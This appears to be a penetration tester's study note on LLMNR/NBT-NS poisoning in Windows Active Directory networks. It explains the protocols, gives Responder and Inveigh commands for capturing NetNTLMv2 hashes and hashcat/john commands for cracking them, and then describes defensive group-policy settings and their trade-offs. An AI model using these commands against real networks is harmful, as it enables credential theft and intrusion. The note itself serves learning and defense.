NBT-NS Poisoning
## Theory
- **NetBIOS - Network Basic Input/Output System** protocol in Windows system that act similar to domain names (link name for particular shares, printers.. e.g: \\printers, \\sharesfiles to a particular IP address). NetBIOS was replaced by SMB (Server Message Block) protocol in future implementation of Windows.
- **LLMNR - Link-Local Multicast Name Resolution** protocol use in Active Directory environment to resolve names of shared files (Similar to a DNS Resolver). LLMNR protocol resolves SMB file share names.
- **NBT-NS** - **NetBIOS Name Service** same as LLMNR, however, used for legacy systems where NetBIOS is used instead (DNS resolution for NetBIOS names).

![[Pasted image 20260120102314.png]]
## Attack
### Linux (Kali)
Responder
```bash
responder -I <INTERFACE> -wdFv
responder -I <INTERFACE> -wdPv
```
Cracking
```bash
hashcat -m 5600 <HASH> <WORDLIST>
john --format=netntlmv2 <HASH> --wordlist=<WORDLIST>
```
### Windows
https://github.com/Kevin-Robertson/Inveigh
```
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
C# Inveigh
```
.\Inveigh.exe
```
C# Inveigh commands (esc)
```
HELP
```
## Defenses
- Policy to disable LLMNR protocol → LLMNR/NBT-NS poisoning not viable (Computer Configuration --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution.")
![](../../img/Pasted%20image%2020260802190830.png)
- Policy to disable NBT-NS (Network connections > Network Adapter Properties > TCP/ IPv4 Properties > Advanced tab > WINS tabs and disable “NetBIOS over TCP/IP” (this must be done locally on each workstation)
- Disadvantages
    Disabling LLMNR/NBT-NS can be disadvantageous:
    - Removed fallback mechanism for DNS resolution.
    - LLMNR can be used for mixed-network environment where Windows and non-Windows devices coexists.
    - Some legacy applications relies on LLMNR for name resolution.
    - Removed diagnostic and troubleshooting method (remove potential information to troubleshoot network connectivity issues).

If LLMNR/NBT-NS **cannot be disabled** solutions can be:
- Using Network Access Control (network AC).
- Use strong passwords so hashes are more difficult to be cracked.